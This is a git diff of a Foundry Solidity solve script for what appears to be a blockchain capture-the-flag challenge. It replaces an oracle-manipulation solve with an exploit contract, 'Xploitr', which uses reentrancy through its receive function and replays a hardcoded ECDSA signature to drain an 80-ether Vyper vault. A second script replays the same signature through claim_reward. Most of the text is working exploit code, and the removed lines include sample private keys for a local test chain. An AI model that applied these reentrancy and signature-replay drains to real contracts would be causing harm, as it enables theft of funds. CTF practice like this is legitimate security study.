@@ -1,65 +1,134 @@
-
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.13;
 
 import {Script, console} from "forge-std/Script.sol";
-interface Setup{
-    function challenge() external returns (SynthIDR);
-    function isSolved() external returns (bool);
-}
-contract PriceOracle {
- 
-    function setOperator(address _operator) external {
-    }
-    function setPrice(uint _price) external {
-    }
-}
-contract SynthIDR {
-    function openVault(uint256 _amountToMint) external payable {
-    }
-    function transfer(address _to, uint256 _amount) external returns (bool) {
-        
-    }
+
+interface Vault {
+    event Claimed(address indexed user, uint256 amount);
+
+    function claimed(bytes32 key) external view returns (bool);
+
+    function target_message() external view returns (bytes32);
+
+    function reward_amount() external view returns (uint256);
+
+    function CEO() external view returns (address);
+
+    function fund_contract() external payable;
+
+    function get_message_to_sign() external view returns (bytes32);
+
+    function claim_reward(uint256 v, uint256 r, uint256 s) external;
+
+    function gamble_reward(uint256 v, uint256 r, uint256 s) external;
 }
 
+contract Setup {
+    Vault public challenge;
+    constructor() payable {
+        address deployed_address;
+        bytes memory compiled_vyper_code = hex"7f7eccd7ead486a50dc0e11109d938bdaf7bef10235cc2c1516ebdc81dff4a4c3b6004556801158e460913d0000060055573b1fdc7607932246c3551d4aa17e19c1ea95840f96006556106c356600436101561000d5761061a565b600035601c5260005163dac69654811415610035576000546106715760016000556000600055005b3461067157630abf8ea68114156100525760045460005260206000f35b6309775b478114156102a45760015461067157600160015533610140526045610140513b11156100c1576308c379a06101605260206101805260196101a0527f436f6e74726163742063616e277420626520746f6f20626967000000000000006101c0526101a050606461017cfd5b6000600435602082610220010152602081019050602435602082610220010152602081019050604435602082610220010152602081019050806102205261022090508051806020830120905090506101605260036101605160e05260c052604060c020541561016f576308c379a06101805260206101a052601d6101c0527f596f7520416c726561647920436c61696d65642056726f6f6f2e2e2e2e0000006101e0526101c050606461019cfd5b6101405161016051610180516004546101a0526004356101c0526024356101e05260443561020052610200516101e0516101c0516101a05160065801610620565b6102605261018052610160526101405261026051610180526006546101805114610219576308c379a06101a05260206101c05260116101e0527f496e76616c6964207369676e6174757265000000000000000000000000000000610200526101e05060646101bcfd5b60006101a0526101a08051602001806101e08284600060045af115610671575050600060006101e051610200600554335af11561067157600160036101605160e05260c052604060c02055337fd8138f8a3f377c5259ca548e70e4c2de94f129f5a11036a15b69513cba2b426a6101a0808080600554815250506020905090506101a0a26000600155005b63c48924a38114156105aa5760025461067157600160025533610140526045610140513b1115610313576308c379a06101605260206101805260196101a0527f436f6e74726163742063616e277420626520746f6f20626967000000000000006101c0526101a050606461017cfd5b6000600435602082610220010152602081019050602435602082610220010152602081019050604435602082610220010152602081019050806102205261022090508051806020830120905090506101605260036101605160e05260c052604060c02054156103c1576308c379a06101805260206101a052601d6101c0527f596f7520416c726561647920436c61696d65642056726f6f6f2e2e2e2e0000006101e0526101c050606461019cfd5b6101405161016051610180516004546101a0526004356101c0526024356101e05260443561020052610200516101e0516101c0516101a05160065801610620565b610260526101805261016052610140526102605161018052600654610180511461046b576308c379a06101a05260206101c05260116101e0527f496e76616c6964207369676e6174757265000000000000000000000000000000610200526101e05060646101bcfd5b600554600280820282158284830414171561067157809050905090506101a052436001808210610671578082039050905061010043038112610671574381101561067157406005808206905090506104fa5760006101c0526101c08051602001806102008284600060045af11561067157505060006000610200516102206101a051335af11561067157610556565b60046101c0527f6c6d616f000000000000000000000000000000000000000000000000000000006101e0526101c08051602001806102208284600060045af11561067157505060006000610220516102406000335af115610671575b600160036101605160e05260c052604060c02055337fd8138f8a3f377c5259ca548e70e4c2de94f129f5a11036a15b69513cba2b426a6101c0808080600554815250506020905090506101c0a26000600255005b63cc3c0f068114156105d057600360043560e05260c052604060c0205460005260206000f35b634bb6d6318114156105e85760045460005260206000f35b632381a60e8114156106005760055460005260206000f35b63a10885718114156106185760065460005260206000f35b505b60006000fd5b6101c0526101405261016052610180526101a052610140516101e052610160516102005261018051610220526101a05161024052602060c060806101e060015afa5060c0516000526000516101c051565b600080fd5b61004d6106c30361004d60003961004d6106c3036000f3";
+
+        assembly {
+            deployed_address := create(0, add(compiled_vyper_code, 0x20), mload(compiled_vyper_code))
+        }
+        
+        require(deployed_address != address(0), "Deployment failed");
+        challenge = Vault(deployed_address);
+        challenge.fund_contract{value: 80 ether}();
+    }
+
+    function isSolved() external view returns (bool) {
+        return address(challenge).balance == 0; 
+    }
+
+}
+
+contract Xploitr {
+    Setup immutable setup;
+    Vault immutable challenge;
+    uint immutable v = 28;
+    uint immutable r = 84340066570771003327740667532724463987288408720245297984948571015505358516346;
+    uint immutable s = 95032474890664692080092596891387481471292607604972416241138945022552254035068;
+    bool reent = false;
+
+    constructor(Setup _setup) {
+        setup = _setup;
+        challenge = setup.challenge();
+    }
+
+    
+
+    receive() payable external{
+        if(reent == false){
+            reent = true;
+            uint init_bal = address(this).balance;
+            challenge.gamble_reward(v, r, s);
+            uint post_bal = address(this).balance;
+            require(init_bal != post_bal);
+            require(setup.isSolved());
+        } else {
+        }
+    }
+}
 
 contract SolveScript is Script {
     function setUp() public {}
 
     function run() public {
-        // Get environment variables
         string memory rpcUrl = vm.envString("RPC_URL");
         uint256 privkey = vm.envUint("PRIVKEY");
         address setupAddress = vm.envAddress("SETUP_CONTRACT_ADDR");
+        address playerAddress = vm.addr(privkey);
+
         // Set RPC URL
         vm.createSelectFork(rpcUrl);
         vm.startBroadcast(privkey);
-
-        //interact
-        address oracleAddress = 0xc256638034612C1a13a37cF0254967AEB902404E;
-        PriceOracle oracle = PriceOracle(oracleAddress);
-        oracle.setOperatorIndonesiaBiladi(vm.envAddress("WALLET_ADDR"));
-        oracle.setPrice(1e55); 
+        
         Setup setup = Setup(setupAddress);
-        SynthIDR synth = setup.challenge();
-        synth.openVault{value: 99 ether}(1e33); 
-        synth.transfer(
-            setupAddress, 
-            1e33
-        );
-        require(setup.isSolved(), "Challenge not solved");
+
+        Vault chall = setup.challenge();
+
+        Xploitr xploitr = new Xploitr(setup);
+        console.log("Contract Deployed At");
+        console.log(address(xploitr));
+
+        //cast send 0x0000000000000000000000000000000000000000 --private-key $PRIVKEY --auth 0x4E52933a60967147b63e6213a215327EDAD0Cae6 -r $RPC_URL
 
         vm.stopBroadcast();
+
     }
 }
 
-/* env file example
-RPC_URL="http://localhost:48334/abdd7b67-1a88-4b8b-a5a1-4a3c37c51608"
-PRIVKEY="0x34ab96218189060f60764d85825bb6a2c38baa8d2ebf9e8e3335e25c16591213"
-SETUP_CONTRACT_ADDR="0xe6171E7b01D794b5d6e69B7d2791Ca0D75DFaC7B"
-WALLET_ADDR="0xb71F48C5E0c861A276fFEc281921139012b1648d"
-*/
+contract SolveScript2 is Script {
+    function setUp() public {}
 
-/*
-Usage : forge script thisFile.sol:SolveScript --broadcast 
-*/
+    function run() public {
+        string memory rpcUrl = vm.envString("RPC_URL");
+        uint256 privkey = vm.envUint("PRIVKEY");
+        address setupAddress = vm.envAddress("SETUP_CONTRACT_ADDR");
+        address playerAddress = vm.addr(privkey);
+
+        // Set RPC URL
+        vm.createSelectFork(rpcUrl);
+        vm.startBroadcast(privkey);
+        
+        Setup setup = Setup(setupAddress);
+
+        Vault chall = setup.challenge();
+
+        //refresh block
+//        payable(address(4)).call{value: 1}("");
+
+        uint v = 28;
+        uint r = 84340066570771003327740667532724463987288408720245297984948571015505358516346;
+        uint s = 95032474890664692080092596891387481471292607604972416241138945022552254035068;
+
+        chall.claim_reward(v, r, s);
+
+        
+
+        vm.stopBroadcast();
+        //spam forge script src/Sovyper.sol:SolveScript2 --broadcast --skip-simulation
+    }
+}
